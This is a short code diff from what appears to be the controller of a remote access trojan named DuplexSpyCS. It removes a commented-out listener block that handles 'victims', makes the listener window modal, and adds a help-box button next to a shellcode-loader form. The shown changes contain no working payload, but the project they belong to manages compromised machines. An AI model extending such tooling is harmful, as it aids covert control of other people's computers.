@@ -1561,35 +1561,8 @@ namespace DuplexSpyCS
         //LISTEN
         private void toolStripButton1_Click(object sender, EventArgs e)
         {
-            /*
-            frmListen f = new frmListen();
-            f.frmMain = this;
-
-            if (f.ShowDialog() == DialogResult.OK)
-            {
-                string ip = f.ip;
-                int port = f.port;
-                if (listener != null && listener.socket != null && listener.socket.IsBound)
-                {
-                    if (port == listener.m_nPort)
-                    {
-                        MessageBox.Show("This port is in used!", "Bind Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                        return;
-                    }
-
-                    List<clsVictim> lsVictim = listView1.Items.Cast<ListViewItem>().Select(x => GetVictim(x)).ToList();
-                    listener.fnStop();
-
-                    //todo: listener
-                }
-
-                listener.fnStart();
-            }
-
-            */
-
             frmListener f = new frmListener(m_sqlConn, this);
-            f.Show();
+            f.ShowDialog();
         }
 
         //BUILD
@@ -2316,6 +2289,11 @@ namespace DuplexSpyCS
 
             frmShellcodeLoader f = new frmShellcodeLoader(lsVictim);
             f.Show();
+        }
+
+        private void toolStripButton7_Click(object sender, EventArgs e)
+        {
+            new frmBoxHelper("Function\\Main").Show();
         }
     }
 }
